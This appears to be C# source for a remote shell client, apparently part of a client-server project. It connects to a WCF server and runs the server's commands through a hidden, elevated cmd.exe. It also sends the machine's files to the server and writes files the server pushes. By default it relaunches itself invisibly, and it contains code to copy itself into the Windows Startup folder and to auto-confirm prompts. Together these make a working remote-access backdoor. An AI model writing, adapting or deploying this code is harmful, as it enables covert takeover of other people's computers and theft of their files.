using Microsoft.Win32;
using PassiveClient.Authentication;
using PassiveClient.ServiceReference1;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.ServiceModel;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace PassiveClient
{
    public class Program
    {
        const string Virsion = "11";
        static IPassiveShell shelService;
        static Guid id = Guid.NewGuid();
        static bool _fistOperation = true;
        static volatile Object endProgram = new Object();
        private static string _currentTasktId;
        const string run = "Run";
        const string nextCommand = "NextCommand";
        const string closeShell = "CloseShell";
        const string download = "Download";
        const string upload = "Upload";
        static CallBack callback = null;
        static StatusCallBack status = null;
        private static string _passiveClientNickName = string.Empty;
        private static bool shouldRestartConnections = false;
        private static string _wcfServicesPathId;
        private static string _username = string.Empty;
        private static string _password = string.Empty;

        private static object initializeServiceReferences<T>(string path = null)
        {
            if(string.IsNullOrEmpty(path))
            {
                path = string.Format("PassiveShell/{0}", _wcfServicesPathId);
            }
            //Confuguring the Shell service
            var shellBinding = new BasicHttpBinding();
            shellBinding.Security.Mode = BasicHttpSecurityMode.None;
            shellBinding.CloseTimeout = TimeSpan.MaxValue;
            shellBinding.ReceiveTimeout = TimeSpan.MaxValue;
            shellBinding.SendTimeout = new TimeSpan(0, 0, 10, 0, 0);
            shellBinding.OpenTimeout = TimeSpan.MaxValue;
            shellBinding.MaxReceivedMessageSize = int.MaxValue;
            shellBinding.MaxBufferPoolSize = int.MaxValue;
            shellBinding.MaxBufferSize = int.MaxValue;
            //Put Public ip of the server copmuter
            var shellAdress = string.Format("http://localhost:80/ShellTrasferServer/{0}", path);
            var shellUri = new Uri(shellAdress);
            var shellEndpointAddress = new EndpointAddress(shellUri);
            var shellChannel = new ChannelFactory<T>(shellBinding, shellEndpointAddress);
            var shelService = shellChannel.CreateChannel();
            return shelService;
        }

        private static void downloadFile(string fileName, string directory, string pathToSaveOnServer)
        {
            var path = Path.Combine(directory, fileName);
            FileInfo fileInfo = new FileInfo(path);
            RemoteFileInfo uploadRequestInfo = new RemoteFileInfo();
            uploadRequestInfo.FileName = fileName;
            uploadRequestInfo.Length = fileInfo.Length;
            uploadRequestInfo.PathToSaveOnServer = pathToSaveOnServer;
            uploadRequestInfo.taskId = _currentTasktId;
            uploadRequestInfo.id = id.ToString();

            using (var file = File.OpenRead(path))
            {
                uploadRequestInfo.FileSize = file.Length.ToString();
                int bytesRead;
                var chunk = 999999;
                var byteStream = new byte[chunk * 10];
                while ((bytesRead = file.Read(byteStream, 0, byteStream.Length)) > 0)
                {

                    for (var i = 0; i < bytesRead; i = i + chunk)
                    {
                        uploadRequestInfo.FileByteStream = byteStream.Skip(i).Take(chunk).ToArray();
                        uploadRequestInfo.FileEnded = false;
                        SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() =>
                        {
                            shelService.StartTransferData();
                            shelService.PassiveDownloadedFile(uploadRequestInfo);
                        });
                    }
                }
                uploadRequestInfo.FileByteStream = new byte[0];
                uploadRequestInfo.FileEnded = true;
                SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() =>
                {
                    shelService.StartTransferData();
                    shelService.PassiveDownloadedFile(uploadRequestInfo);
                });
            }
        }

        public static void SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(Action op, Action inTimeOutException = null, Action inCommunicationException = null, Action inGeneralException = null)
        {
            while (true)
            {
                try
                {
                    op();
                    break;
                }
                catch (TimeoutException e)
                {
                    if (inTimeOutException != null)
                        inTimeOutException();
                    //try again
                }
                catch (CommunicationException e)
                {
                    if (inCommunicationException != null)
                        inCommunicationException();
                    //try again
                }
                catch (Exception e)
                {
                    if (inGeneralException != null)
                        inGeneralException();
                    else
                        throw e;
                }
            }
        }

        public static T SendRequestAndTryAgainIfTimeOutOrEndpointNotFound<T>(Func<T> op, Action inTimeOutException = null, Action inCommunicationException = null, Action inGeneralException = null)
        {
            while (true)
            {
                try
                {
                    return op();
                }
                catch (TimeoutException e)
                {
                    if (inTimeOutException != null)
                        inTimeOutException();
                    //try again
                }
                catch (CommunicationException e)
                {
                    if (inCommunicationException != null)
                        inCommunicationException();
                    //try again
                }
                catch (Exception e)
                {
                    if (inGeneralException != null)
                        inGeneralException();
                    else
                        throw e;
                }
            }
        }

        public static void UploadFile(RemoteFileInfo request)
        {
            DownloadRequest requestData = new DownloadRequest();
            requestData.taskId = _currentTasktId;
            requestData.id = request.id;
            var endDownload = false;
            using (var fileStrem = CreateNewFile(request.FileName, request.PathToSaveOnServer))
            {
                if (fileStrem == null)
                {
                    SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() =>
                    {
                        shelService.ErrorUploadDownload(id.ToString(), request.taskId, string.Format("Fail to create File in your computer {0}", request.FileName));
                    }); 
                    return;
                }

                while (!endDownload)
                {
                    if (request.FileName.StartsWith("Error"))
                    {
                        throw new Exception(request.FileName);
                    }
                    if (request.FileEnded)
                    {
                        endDownload = true;
                        break;
                    }
                    else
                    {
                        var lastByteToWrite = 0;
                        var lastChunk = fileStrem.Position + request.FileByteStream.Length >= long.Parse(request.FileSize);
                        if (lastChunk)
                            lastByteToWrite = Convert.ToInt32(long.Parse(request.FileSize) - fileStrem.Position);
                        fileStrem.Write(request.FileByteStream, 0, lastChunk ? lastByteToWrite : request.FileByteStream.Length);
                        fileStrem.Flush();
                    }

                    SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() =>
                    {
                        request = shelService.PassiveGetUploadFile(requestData);
                    });     
                }
            }
        }

        private static FileStream CreateNewFile(string fileName, string pathTosave)
        {
            var dirPath = pathTosave;
            var path = Path.Combine(dirPath, fileName);

            try
            {

                // Delete the file if it exists.
                if (File.Exists(path))
                {
                    // Note that no lock is put on the
                    // file and the possibility exists
                    // that another process could do
                    // something with it between
                    // the calls to Exists and Delete.
                    File.Delete(path);
                }

                // Create the file.
                if (!Directory.Exists(dirPath))
                    Directory.CreateDirectory(dirPath);
                FileStream fs = File.Create(path);
                return fs;
            }
            catch (Exception e)
            {
                return null;
            }
        }

        private static void setStartUp(bool set)
        {
                AddToStartup(set);
        }

        public static bool AddToStartup(bool set)
        {
            var path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + System.Reflection.Assembly.GetExecutingAssembly().Location.Split('\\').Last();
            if (set)
            {
                if (!File.Exists(path))
                {
                    try
                    {
                        File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, path, true);
                        Console.WriteLine("Added to startup");
                    }
                    catch(Exception e)
                    {
                        Console.WriteLine("Error: "+e.Message);
                    }
                    
                }
            }
            else
            {
                if (File.Exists(path))
                {
                    try
                    {
                        File.Delete(path);
                        Console.WriteLine("Deleted from startup");
                    }
                    catch
                    {
                        //This means that the file is running so we need to close the program and then delete it
                        StreamWriter sw = new StreamWriter("delete.bat");
                        //Waites 60 sec
                        sw.WriteLine("ping 127.0.0.1 -n 60 > nul");
                        //First enter the directory
                        sw.WriteLine("cd "+ Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                        //only after that delete the file
                        sw.WriteLine("del "+ System.Reflection.Assembly.GetExecutingAssembly().Location.Split('\\').Last());
                        //if the in this catch that must be because the file is in startup folder, so delete the newly created delete.bat
                        sw.WriteLine("del delete.bat");
                        sw.Close();
                        ProcessStartInfo Info = new ProcessStartInfo();
                        Info.WindowStyle = ProcessWindowStyle.Hidden;
                        Info.CreateNoWindow = true;
                        Info.FileName = "delete.bat";
                        Process.Start(Info);
                    }   
                }
            }
            return true;
        }

        private static void PrintArgsUsage()
        {
            Console.WriteLine("hidden=True/False");
            Console.WriteLine("morethanoneclinet=True/False");
            Console.WriteLine("nickname=<some name>");
            Console.WriteLine("username=<user name>");
            Console.WriteLine("password=<password>");
        }

        public static void Main(string[] args)
        {
            var allowMoreThan1ClientsInParalel = false;
            var hiddenWindow = true;
            string username = string.Empty;
            string password = string.Empty;

            PrintArgsUsage();
            if (args.Length > 0)
            {
                for(int i = 0; i < args.Length; i ++)
                {
                    var arg = args[i].Split('=').First();
                    var val = args[i].Split('=').Last();
                    if (arg.ToLower() == "hidden")
                    {
                        if (bool.TryParse(val, out hiddenWindow)) continue;
                        hiddenWindow = true;
                    }
                    if (arg.ToLower() == "morethanoneclinet")
                    {
                        if (bool.TryParse(val, out allowMoreThan1ClientsInParalel)) continue;
                        allowMoreThan1ClientsInParalel = false;
                    }
                    if (arg.ToLower() == "nickname")
                    {
                        _passiveClientNickName = val;
                    }
                    if (arg.ToLower() == "username")
                    {
                        username = val;
                        _username = username;
                    }
                    if (arg.ToLower() == "password")
                    {
                        password = val;
                        _password = password;
                    }
                }
            }

            if (string.IsNullOrEmpty(_username) || string.IsNullOrEmpty(_password))
                throw new Exception("Cant connect without user name and password. please run with cmd args userName=? password=?");
            var windowHandle = Process.GetCurrentProcess().MainWindowHandle;
            if (hiddenWindow && windowHandle != IntPtr.Zero)
                OpenHostAsNewProcess(string.Format("morethanoneclinet={0} hidden={1} nickname={2} username={3} password={4}", 
                    allowMoreThan1ClientsInParalel.ToString(), hiddenWindow.ToString(), _passiveClientNickName, username, password));
            if (!allowMoreThan1ClientsInParalel)
                CheckIfOtherClientOpen();
            //setStartUp(true);
            //SystemEvents.PowerModeChanged += OnPowerModeChanged;
            MainLoop();
            Console.WriteLine("Exited...");
            SystemEvents.PowerModeChanged -= OnPowerModeChanged;
        }

        private static void OnPowerModeChanged(object sender, PowerModeChangedEventArgs e)
        {
            if (e.Mode == PowerModes.StatusChange || e.Mode == PowerModes.Suspend) return;
            SystemEvents.PowerModeChanged -= OnPowerModeChanged;   
            try
            {
                if (shelService != null)
                {
                    ((ICommunicationObject)shelService).Close();
                    shelService = null;
                }
                if (status != null)
                {
                    status.Dispose();
                    status = null;
                }
                if (callback != null)
                {
                    callback.Dispose();
                    callback = null;
                }

            }
            catch { }
            Thread.Sleep(1000);
            OpenHostAsNewProcess(string.Format("morethanoneclinet=True hidden=False nickname={0} username={1} password={2}", _passiveClientNickName, _username, _password));
        }

        private static void CheckIfOtherClientOpen()
        {
            for(var i = 0;i<15; i++)
            {
                CloseIfDuplicationOfOpenProcess();
                Thread.Sleep(1000);
            }
        }

        private static void CloseIfDuplicationOfOpenProcess()
        {
            if (Process.GetProcessesByName(Path.GetFileNameWithoutExtension
                            (System.Reflection.Assembly.GetEntryAssembly().Location)).Count() > 1) Process.GetCurrentProcess().Kill();
        }

        private static void OpenHostAsNewProcess(string args)
        {
            string path = System.Reflection.Assembly.GetEntryAssembly().Location;
            try
            {
                Process.Start(new ProcessStartInfo()
                {
                    UseShellExecute = false,
                    FileName = path,
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                });
            }
            finally
            {
                Environment.Exit(0);
            }
        }

        public static bool Authenticate(string userName, string password)
        {
            _username = userName;
            _password = password;
            var auth = (IAuthentication)initializeServiceReferences<IAuthentication>("Authentication");
            var resp = auth.Authenticate(new AuthenticateRequest()
            {
                userName = _username,
                password = _password
            });
            if (auth != null)
            {
                ((ICommunicationObject)auth).Close();
            }
            return !string.IsNullOrEmpty(resp.AuthenticateResult);
        }

        private static void MainLoop()
        {
            try
            {
                var auth = (IAuthentication)initializeServiceReferences<IAuthentication>("Authentication");
                var resp = auth.Authenticate(new AuthenticateRequest()
                {
                    userName = _username,
                    password = _password
                });

                if (resp.AuthenticateResult == null) throw new Exception(string.Format("Could not Authenticate username {0} and pssword {1}", _username, _password));

                _wcfServicesPathId = resp.AuthenticateResult;
                shelService =(IPassiveShell)initializeServiceReferences<IPassiveShell>();

                CleanPrevId();
                while (!shelService.Subscribe(id.ToString(), Virsion , _passiveClientNickName))
                {
                    Console.WriteLine(string.Format("Wasn't able to connect with {0} id, tring diffrent one...", id));
                    CleanPrevId();
                    //maybe this guid is taken, try new one
                    id = Guid.NewGuid();
                }
                _fistOperation = false;
                RegisterCallBacks();
                var timerTread = StartKeepAliveCallbackThread(callback, status);
                Console.WriteLine(string.Format("Subscribed with id: {0}", id));
                Console.WriteLine("Wating for command");
                //Make this thrad wait untill there is a CloseClient command from the active client
                lock (endProgram)
                {
                    shouldRestartConnections = false;
                    Monitor.Wait(endProgram);
                }
                if (shelService != null)
                {
                    ((ICommunicationObject)shelService).Close();
                    shelService = null;
                }
                if (auth != null)
                {
                    ((ICommunicationObject)auth).Close();
                    auth = null;
                }
                callback.Dispose();
                status.Dispose();
                timerTread.Dispose();
                if(shouldRestartConnections)
                {
                    MainLoop();
                }
                   
                setStartUp(false);
            }
            catch (Exception e)
            {
                Console.WriteLine("Server is not responding");
                if (callback != null)
                    callback.Dispose();
                if (status != null)
                    status.Dispose();
                Thread.Sleep(2000);
                if (shelService != null)
                {
                    ((ICommunicationObject)shelService).Close();
                    shelService = null;
                }
                Thread.Sleep(1000);
                MainLoop();
            }
            
        }

        private static Timer StartKeepAliveCallbackThread(CallBack callback, StatusCallBack statusCallback)
        {
            var startTimeSpan = TimeSpan.Zero;
            var periodTimeSpan = TimeSpan.FromSeconds(45);

            var timer = new Timer((e) =>
            {
                if (shouldRestartConnections) return;

                var numberOfTries = 3;
                //maybe the server is down. If so we will close the connection and will reset all the connections;
                while(numberOfTries > 0)
                {
                    try
                    {
                        callback.KeppAlive();
                        statusCallback.KeppAlive();
                        break;
                    }
                    catch
                    {
                        numberOfTries--;
                    }
                }

                if(numberOfTries == 0 )
                {
                    shouldRestartConnections = true;
                    lock (endProgram)
                    {
                        Monitor.PulseAll(endProgram);
                    }
                }
                
            }, null, startTimeSpan, periodTimeSpan);
            return timer;
        }

        private static void RegisterCallBacks()
        {
            try
            {  
                status = new StatusCallBack();
                callback = new CallBack();
                callback.SetStatusCallback(status);
                status.SendServerCallBack();
                callback.SendServerCallBack();
            }
            catch(Exception e)
            {
                if (callback != null)
                    callback.Dispose();
                if (status != null)
                    status.Dispose();
                Console.WriteLine("Error Register CallBacks, Disposing and trying again");
                RegisterCallBacks();

            }
        }

        private static void CheckMissions(Shell shellHandler)
        {
            if (SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => shelService.HasCommand(id.ToString())))
                try
                {
                    processNextCommand(shellHandler);
                }
                catch (Exception e)
                {
                    SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => 
                        shelService.ErrorNextCommand(id.ToString(), _currentTasktId, string.Format("Error Next-Command: {0}", e.Message)));
                }

            else if (SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => shelService.HasDownloadCommand(id.ToString())))
                try
                {

                    var currentId = id;
                    var downloadCommand = SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => shelService.PassiveGetDownloadFile(new DownloadRequest
                    {
                        id = currentId.ToString()
                    }));
                    //In case that between the has command to the get command the task has been deleted
                    //the sign is the empty Guid
                    if (downloadCommand.taskId == Guid.Empty.ToString())
                        return;
                    _currentTasktId = downloadCommand.taskId;
                    var downloadFileName = downloadCommand.FileName;
                    var downloadDirectory = downloadCommand.PathInServer;
                    var downloadPathToSave = downloadCommand.PathToSaveInClient;

                    downloadFile(downloadFileName, downloadDirectory, downloadPathToSave);
                }
                catch (Exception e)
                {
                    SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => 
                        shelService.ErrorUploadDownload(id.ToString(), _currentTasktId, e.Message));
                }

            else if (SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => shelService.HasUploadCommand(id.ToString())))
                try
                {
                    var currentId = id;
                    var uploadCommand = SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => shelService.PassiveGetUploadFile(new DownloadRequest
                    {
                        id = currentId.ToString()
                    }));
                    //In case that between the has command to the get command the task has been deleted
                    //the sign is the empty Guid
                    if (uploadCommand.taskId == Guid.Empty.ToString())
                        return;
                    _currentTasktId = uploadCommand.taskId;
                    UploadFile(uploadCommand);
                    SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => shelService.PassiveUploadedFile(id.ToString(), _currentTasktId));
                }

                catch (Exception e)
                {
                    SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => 
                    shelService.ErrorUploadDownload(id.ToString(), _currentTasktId, e.Message));
                }
        }
        

        private static void CleanPrevId()
        {
            if (_fistOperation)
                return;
            try
            {
                shelService.CommandResponse(id.ToString(), _currentTasktId, "CleanId");
            }
            catch
            {
                Console.WriteLine("Server not responding. Waiting tor server to respond...");
                Thread.Sleep(1000);
                CleanPrevId();
            }
        }

        private static void processNextCommand(Shell shellHandler)
        {
            var command = SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => shelService.PassiveNextCommand(id.ToString()));
            _currentTasktId = command.Item3;
            switch (command.Item1)
            {
                case run:
                    SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => 
                        shelService.PassiveClientRun(id.ToString(), _currentTasktId, shellHandler.Run()));
                    break;
                case nextCommand:
                    SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => 
                        shelService.CommandResponse(id.ToString(), _currentTasktId, shellHandler.NextCommand(command.Item2)));
                    break;
                case closeShell:
                    shellHandler.CloseShell();
                    SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => 
                        shelService.CommandResponse(id.ToString(), _currentTasktId,"EndProg"));
                    lock(endProgram)
                    {
                        Monitor.PulseAll(endProgram);
                    }
                    break;
                //In case that between the has command to the get command the task has been deleted
                //the sign is the empty string send by the server
                default:
                    break;
            }
        }

        public sealed class Shell
        {
            private string _lastCommand;
            private Process _process;

            public void CloseShell()
            {
                if(_process != null)
                {
                    _process.StandardOutput.Close();
                    _process.StandardInput.Close();
                    _process.Close();
                } 
            }


            public string NextCommand(string command)
            {
                _lastCommand = command;
                var stdin = _process.StandardInput;
                stdin.WriteLine(command);
                StringBuilder str;
                string returnAns;
                GetStdOutString(stdin, out str, out returnAns, command);
                str.Clear();
                return returnAns;
            }

            public bool WaitforExitAndAbort(Action act, int timeout)
            {
                var wait = new ManualResetEvent(false);
                var work = new Thread(() =>
                {
                    act();
                    wait.Set();
                });
                work.Start();
                var signal = wait.WaitOne(timeout);
                if (!signal)
                {
                    work.Abort();
                }
                return signal;
            }

            private void GetStdOutString(StreamWriter stdin, out StringBuilder str, out string returnAns, string command)
            {
                var clientNextLine = "";
                stdin.WriteLine("echo #WAITING");
                stdin.Flush();

                var stdout = _process.StandardOutput;
                str = new StringBuilder();
                while (true)
                {
                    string line = string.Empty;
                    if (!WaitforExitAndAbort(() => 
                    {
                        line = stdout.ReadLine();
                    }, 30 * 1000))
                    {
                        if(line.Contains("All"))
                        {
                            stdin.WriteLine("All");
                            stdin.WriteLine("echo #WAITING");
                        }
                        else if(line.Contains("Yes"))
                        {
                            stdin.WriteLine("Yes");
                            stdin.WriteLine("echo #WAITING");
                            
                        }
                        else
                        {
                            break;
                        }
                        
                    }
                    
                    if (line == null)
                    {
                        str.AppendLine("Error using command " + command);
                        break;
                    }
					//The last line of the PClient command
                    if (line == "Wating for command")
                    {
                        str.AppendLine(line);
                        break;
                    }
                    if (line == "#WAITING")
                    {
                        break;
                    }
                    if (line.Contains("#WAITING"))
                    {
                        clientNextLine = line.Substring(0, line.Length - "echo#WAITING".Length - "\n\r".Length);
                    }
                    else
                    {
                        str.AppendLine(line);
                    }

                }
                str.AppendLine(clientNextLine);
                returnAns = str.ToString();
            }
            public string Run()
            {
                if (_process != null)
                    _process.Close();
                var p = Process.Start(new ProcessStartInfo()
                {
                    UseShellExecute = false,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    FileName = "cmd.exe",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    WorkingDirectory = Path.GetDirectoryName(@"C:\"),
                    Verb = "runas"
                });
                _process = p;
                StringBuilder str;
                string returnAns;
                GetStdOutString(p.StandardInput, out str, out returnAns, "Activate");
                var resultString = str.ToString();
                str.Clear();
                return resultString;

            }
        }

        public class CallBack : IAletCallBackCallback, IDisposable
        {
            public static AletCallBackClient proxy;
            public static Shell shellHandler = new Shell();
            public static StatusCallBack statusCallBack;
            private bool isDead = false;

            private void SetReliableSessionAndInactivityTimeoutAndReaderQuotas(NetTcpBinding wsd)
            {
                wsd.ReliableSession.Enabled = true;
                wsd.ReliableSession.InactivityTimeout = TimeSpan.MaxValue;
                System.Xml.XmlDictionaryReaderQuotas readerQuotas = new System.Xml.XmlDictionaryReaderQuotas();
                readerQuotas.MaxDepth = System.Int32.MaxValue;
                readerQuotas.MaxStringContentLength = System.Int32.MaxValue;
                readerQuotas.MaxArrayLength = System.Int32.MaxValue;
                readerQuotas.MaxBytesPerRead = System.Int32.MaxValue;
                readerQuotas.MaxNameTableCharCount = System.Int32.MaxValue;
                wsd.ReaderQuotas = readerQuotas;
            }

            public void SetStatusCallback(StatusCallBack status)
            {
                statusCallBack = status;
            }
            public void SendServerCallBack()
            {
                Uri endPointAdress = new Uri(string.Format("net.tcp://localhost/ShellTrasferServer/CallBack/{0}",_wcfServicesPathId));
                NetTcpBinding wsd = new NetTcpBinding();
                wsd.Security.Mode = SecurityMode.None;
                wsd.CloseTimeout = TimeSpan.MaxValue;
                wsd.ReceiveTimeout = TimeSpan.MaxValue;
                wsd.OpenTimeout = TimeSpan.MaxValue;
                wsd.SendTimeout = TimeSpan.MaxValue;
                EndpointAddress ea = new EndpointAddress(endPointAdress);
                proxy = new AletCallBackClient(new InstanceContext(this), wsd, ea);
                proxy.InnerDuplexChannel.OperationTimeout = TimeSpan.MaxValue;
                proxy.InnerChannel.OperationTimeout = TimeSpan.MaxValue;
                proxy.RegisterCallBackFunction(id.ToString(), "Main");
            }

            public void CallBackFunction(string str)
            {
                if (str == "livnessCheck")
                    return;
                else if (str.Split(' ').First().ToLower() == "nickname")
                    _passiveClientNickName = str.Split(' ').Last();
                try
                {
                    CheckMissions(shellHandler);
                }
                catch(Exception e)
                {
                    Dispose();
                    statusCallBack.Dispose();
                    if (shelService != null)
                    {
                        ((ICommunicationObject)shelService).Close();
                        shelService = null;
                    }
                    MainLoop();
                }
            }

            public void Dispose()
            {
                isDead = true;
                if (proxy != null && proxy.State == CommunicationState.Opened)
                    proxy.Close();
            }

            public void KeppAlive()
            {
                if(!isDead)
                     proxy.KeepCallBackAlive(id.ToString());
            }

            public void KeepCallbackALive()
            {
                //Do nothing, this function is only for the server in order to send traffic through the connection pipe  
            }
        }

        public class StatusCallBack : IAletCallBackCallback, IDisposable
        {
            public static AletCallBackClient proxy;
            public static Shell shellHandler = new Shell();
            private bool isDead;

            private void SetReliableSessionAndInactivityTimeoutAndReaderQuotas(NetTcpBinding wsd)
            {
                wsd.ReliableSession.Enabled = true;
                wsd.ReliableSession.InactivityTimeout = TimeSpan.MaxValue;
                System.Xml.XmlDictionaryReaderQuotas readerQuotas = new System.Xml.XmlDictionaryReaderQuotas();
                readerQuotas.MaxDepth = System.Int32.MaxValue;
                readerQuotas.MaxStringContentLength = System.Int32.MaxValue;
                readerQuotas.MaxArrayLength = System.Int32.MaxValue;
                readerQuotas.MaxBytesPerRead = System.Int32.MaxValue;
                readerQuotas.MaxNameTableCharCount = System.Int32.MaxValue;
                wsd.ReaderQuotas = readerQuotas;
            }

            public void SendServerCallBack()
            {
                
                Uri endPointAdress = new Uri(string.Format("net.tcp://localhost/ShellTrasferServer/CallBack/{0}",_wcfServicesPathId));
                NetTcpBinding wsd = new NetTcpBinding();
                wsd.Security.Mode = SecurityMode.None;
                wsd.CloseTimeout = TimeSpan.MaxValue;
                wsd.ReceiveTimeout = TimeSpan.MaxValue;
                wsd.OpenTimeout = TimeSpan.MaxValue;
                wsd.SendTimeout = TimeSpan.MaxValue;
                EndpointAddress ea = new EndpointAddress(endPointAdress);
                proxy = new AletCallBackClient(new InstanceContext(this), wsd, ea);
                proxy.InnerDuplexChannel.OperationTimeout = TimeSpan.MaxValue;
                proxy.InnerChannel.OperationTimeout = TimeSpan.MaxValue;
                proxy.RegisterCallBackFunction(id.ToString(),"status");
            }

            public void CallBackFunction(string str)
            { 
            }

            public void KeppAlive()
            {
                if(!isDead)
                    proxy.KeepCallBackAlive(id.ToString());
            }

            public void KeepCallbackALive()
            {
                //Do nothing, this function is only for the server in order to send traffic through the connection pipe  
            }

            public void Dispose()
            {
                isDead = true;
                if (proxy != null && proxy.State == CommunicationState.Opened)
                    proxy.Close();
            }
        }


    }
}
